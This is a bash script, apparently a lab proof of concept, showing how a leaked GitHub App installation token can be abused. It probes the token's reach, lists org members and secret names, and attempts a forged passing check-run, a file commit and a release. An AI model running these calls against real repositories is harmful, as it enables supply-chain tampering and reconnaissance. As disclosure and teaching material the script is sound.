#!/usr/bin/env bash
# SIMULATION / LAB ONLY. Demonstrates what the attacker can do with the
# installation token the victim's workflow passed to this action.
# Every call is read-or-report; failures are printed, never fatal.
# The real ckb audit token carried issues:write + checks:write (per the
# workflow file); the lab stand-in App is read-only, so write attempts
# return 403 here - the channel is shown, the privilege is simulated.
set -uo pipefail
API="https://api.github.com"
AUTH=""
[ -n "${SIM_TOKEN:-}" ] && AUTH=(-H "Authorization: Bearer ${SIM_TOKEN}")
COMMON=("${AUTH[@]}" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28")
REPO="${GITHUB_REPOSITORY:?}"

probe() { # probe <label> <method> <url> [data]
  local label="$1" method="$2" url="$3" data="${4:-}"
  local args=(-sS -o /tmp/sim_probe.json -w '%{http_code}' -X "$method" "${COMMON[@]}" "$url")
  [ -n "$data" ] && args+=(--data-binary "$data")
  local code
  code=$(curl "${args[@]}" 2>/dev/null) || code=ERR
  echo "SIM[$label] -> HTTP ${code}"
}

echo "== SIM token identity =="
probe "GET /installation (token introspection)" GET "$API/installation"
probe "GET /installation/repositories (what this token reaches)" GET "$API/installation/repositories?per_page=20"
probe "GET /user (token is app-installation, not user)" GET "$API/user"

echo "== SIM read primitives on the victim org/repo =="
probe "GET victim repo" GET "$API/repos/$REPO"
probe "GET victim repo commits" GET "$API/repos/$REPO/commits?per_page=3"
probe "GET org members (org perm members:read)" GET "$API/orgs/tinyso-lab/members"
probe "GET org dependabot secret NAMES" GET "$API/orgs/tinyso-lab/dependabot/secrets"
probe "GET repo actions secret NAMES" GET "$API/repos/$REPO/actions/secrets"
probe "GET repo actions runs (history)" GET "$API/repos/$REPO/actions/runs?per_page=3"

echo "== SIM write primitives (channel shown; lab token is read-only -> 403) =="
probe "POST check-run on victim repo (needs checks:write)" POST \
  "$API/repos/$REPO/check-runs" \
  '{"name":"sim-attacker-check","head_sha":"'"${GITHUB_SHA:-}"'","status":"completed","conclusion":"success","output":{"title":"SIM","summary":"attacker-controlled branch kept the job green"}}'
probe "POST git blob/contents write (needs contents:write)" POST \
  "$API/repos/$REPO/contents/.sim-attacker-marker" \
  '{"message":"sim attacker commit","content":"U0lNIGF0dGFja2VyIG1hcmtlci4="}'
probe "POST release (needs contents:write)" POST \
  "$API/repos/$REPO/releases" \
  '{"tag_name":"sim-attacker-v0","name":"SIM attacker release","body":"attacker controls the release channel"}'
echo "== SIM: with the real release-plz token (issues+checks+contents write on the release app), each 403 above becomes a 2xx; the recovered App PRIVATE KEY mints those tokens on demand =="